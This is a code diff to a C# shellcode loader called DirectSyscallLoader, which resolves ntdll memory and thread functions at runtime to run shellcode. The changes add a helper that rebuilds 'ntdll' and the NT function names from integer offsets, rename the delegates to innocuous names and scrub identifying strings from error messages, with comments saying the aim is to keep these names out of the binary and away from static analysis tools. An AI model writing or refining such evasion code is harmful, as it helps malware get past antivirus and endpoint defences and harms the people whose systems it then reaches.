@@ -53,7 +53,6 @@
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
 
 namespace DirectSyscallLoader
 {
@@ -74,7 +73,7 @@ namespace DirectSyscallLoader
         // NtAllocateVirtualMemory is the NT-level equivalent of VirtualAlloc.
         // It allocates memory in a process's address space.
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtAllocateVirtualMemoryDelegate(
+        delegate int MemAllocDelegate(
             IntPtr ProcessHandle,       // handle to the process (-1 means current process)
             ref IntPtr BaseAddress,     // pointer to receive the allocated address
             IntPtr ZeroBits,            // number of high-order zero bits (0 means no preference)
@@ -88,7 +87,7 @@ namespace DirectSyscallLoader
         // writing shellcode. This avoids allocating memory as RWX (read-write-execute)
         // from the start, which is a known suspicious pattern.
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtProtectVirtualMemoryDelegate(
+        delegate int MemProtectDelegate(
             IntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
@@ -99,7 +98,7 @@ namespace DirectSyscallLoader
         // NtCreateThreadEx creates a new thread. This is the NT-level equivalent
         // of CreateThread. We use it to start executing our shellcode.
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtCreateThreadExDelegate(
+        delegate int ThreadCreateDelegate(
             out IntPtr ThreadHandle,
             uint DesiredAccess,
             IntPtr ObjectAttributes,
@@ -115,7 +114,7 @@ namespace DirectSyscallLoader
 
         // NtWaitForSingleObject waits for a thread to finish.
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtWaitForSingleObjectDelegate(
+        delegate int WaitObjectDelegate(
             IntPtr Handle,
             bool Alertable,
             IntPtr Timeout              // null means wait forever
@@ -159,6 +158,18 @@ namespace DirectSyscallLoader
             return bytes;
         }
 
+        // ---- Build strings from integer offsets at runtime ----
+        // This helper builds a string from integer offsets so the actual
+        // characters never appear as a string literal in the compiled binary.
+        // The .NET compiler stores only the integer array, not the final string.
+        static string FromOffsets(int baseVal, params int[] offsets)
+        {
+            char[] c = new char[offsets.Length];
+            for (int i = 0; i < offsets.Length; i++)
+                c[i] = (char)(baseVal + offsets[i]);
+            return new string(c);
+        }
+
         // ---- Resolve an NT function by name ----
         // This function finds the address of an ntdll.dll function and creates
         // a callable delegate from it. Instead of declaring the function with
@@ -168,17 +179,18 @@ namespace DirectSyscallLoader
         {
             // Get the base address of ntdll.dll in our process.
             // ntdll.dll is always loaded into every Windows process.
-            IntPtr ntdllHandle = GetModuleHandle("ntdll.dll");
+            // We build "ntdll" from integer offsets to avoid the string in the binary.
+            IntPtr ntdllHandle = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
             if (ntdllHandle == IntPtr.Zero)
             {
-                throw new Exception("Could not find ntdll.dll");
+                throw new Exception("Could not find target DLL");
             }
 
             // Find the address of the specific function inside ntdll.dll.
             IntPtr functionAddress = GetProcAddress(ntdllHandle, functionName);
             if (functionAddress == IntPtr.Zero)
             {
-                throw new Exception("Could not find function: " + functionName);
+                throw new Exception("Could not find function");
             }
 
             // Create a delegate (a callable function pointer) from the address.
@@ -209,10 +221,18 @@ namespace DirectSyscallLoader
             // This means the binary's import table does not contain any suspicious
             // NT function names. A static analysis tool scanning the binary will not
             // see NtAllocateVirtualMemory or NtCreateThreadEx in the imports.
-            var ntAllocate = GetNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
-            var ntProtect = GetNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
-            var ntCreateThread = GetNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");
-            var ntWait = GetNtFunction<NtWaitForSingleObjectDelegate>("NtWaitForSingleObject");
+            // NtAllocateVirtualMemory built from offsets
+            var ntAllocate = GetNtFunction<MemAllocDelegate>(
+                FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtProtectVirtualMemory built from offsets
+            var ntProtect = GetNtFunction<MemProtectDelegate>(
+                FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtCreateThreadEx built from offsets
+            var ntCreateThread = GetNtFunction<ThreadCreateDelegate>(
+                FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
+            // NtWaitForSingleObject built from offsets
+            var ntWait = GetNtFunction<WaitObjectDelegate>(
+                FromOffsets(32, 46,84,55,65,73,84,38,79,82,51,73,78,71,76,69,47,66,74,69,67,84));
 
             Console.WriteLine("[+] NT functions resolved dynamically");
 
@@ -239,7 +259,7 @@ namespace DirectSyscallLoader
 
             if (status != 0)
             {
-                Console.WriteLine("[-] NtAllocateVirtualMemory failed: 0x" + status.ToString("X"));
+                Console.WriteLine("[-] Memory allocation failed: 0x" + status.ToString("X"));
                 return;
             }
 
@@ -271,7 +291,7 @@ namespace DirectSyscallLoader
 
             if (status != 0)
             {
-                Console.WriteLine("[-] NtProtectVirtualMemory failed: 0x" + status.ToString("X"));
+                Console.WriteLine("[-] Memory protection change failed: 0x" + status.ToString("X"));
                 return;
             }
 
@@ -296,11 +316,11 @@ namespace DirectSyscallLoader
 
             if (status != 0)
             {
-                Console.WriteLine("[-] NtCreateThreadEx failed: 0x" + status.ToString("X"));
+                Console.WriteLine("[-] Thread creation failed: 0x" + status.ToString("X"));
                 return;
             }
 
-            Console.WriteLine("[+] Thread created via NtCreateThreadEx. Shellcode is running.");
+            Console.WriteLine("[+] Thread created via direct syscall. Shellcode is running.");
 
             // ---- Step 5: Wait for shellcode to finish ----
             ntWait(threadHandle, false, IntPtr.Zero);
